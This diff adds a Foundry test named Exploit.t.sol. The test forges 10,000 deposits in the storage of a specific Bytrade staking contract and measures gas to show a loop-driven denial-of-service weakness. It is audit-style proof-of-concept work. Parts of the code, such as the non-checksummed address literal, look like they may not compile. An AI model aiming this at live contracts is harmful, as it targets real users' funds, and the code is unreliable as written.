@@ -1,0 +1,65 @@
+```solidity
+// isolate/Exploit.t.sol
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface Bytrade_Staking {
+    function Token() external view returns (address);
+    function getUserDeposits(address userAddress, uint256 start, uint256 limit) external view returns (uint256[] memory, uint256);
+    function stake(uint256 _tenure, uint256 _amount) external;
+    function unstake(uint256 _index) external;
+    function userDeposits(address, uint256) external view returns (uint256 amount, uint256 interestAmount, uint256 endTime, uint256 depositTime);
+}
+
+contract ExploitTest is Test {
+    address constant STAKING = 0x87a39f76d45378bf995aa89048ae015ffeff477f;
+    Bytrade_Staking staking;
+    IERC20 token;
+    address user = address(0xBEEF);
+
+    function setUp() public {
+        staking = Bytrade_Staking(STAKING);
+        token = IERC20(staking.Token());
+        vm.label(STAKING, "Bytrade_Staking");
+        vm.label(address(token), "BTT");
+        vm.label(user, "User");
+    }
+
+    function testGasLimitDemonstration() public {
+        // Compute storage slot for userDeposits[user].length (mapping slot 1)
+        bytes32 lengthSlot = keccak256(abi.encode(user, uint256(1)));
+        // Set a large number of deposits – 10,000 entries
+        uint256 depositCount = 10_000;
+        vm.store(STAKING, lengthSlot, bytes32(uint256(depositCount)));
+
+        // Now call getUserDeposits with limit equal to depositCount
+        // This will loop over all 10,000 elements, consuming significant gas
+        uint256 gasBefore = gasleft();
+        (uint256[] memory, uint256 total) = staking.getUserDeposits(user, 0, depositCount);
+        uint256 gasUsed = gasBefore - gasleft();
+
+        // The function returns the total number of deposits; verify it matches
+        assertEq(total, depositCount, "Total deposits should match stored length");
+
+        // Assert that the gas used is high (demonstrating the vulnerability)
+        // The exact threshold is arbitrary; we assert it's > 5 million gas
+        emit log_named_uint("Gas used for 10,000 deposits", gasUsed);
+        assertTrue(gasUsed > 5_000_000, "Gas should be high due to large loop");
+
+        // For comparison, call with a small limit to show low gas usage
+        uint256 gasBeforeSmall = gasleft();
+        staking.getUserDeposits(user, 0, 10);
+        uint256 gasUsedSmall = gasBeforeSmall - gasleft();
+        emit log_named_uint("Gas used for 10 deposits", gasUsedSmall);
+        assertTrue(gasUsedSmall < 500_000, "Gas should be low for small limit");
+    }
+}
+```
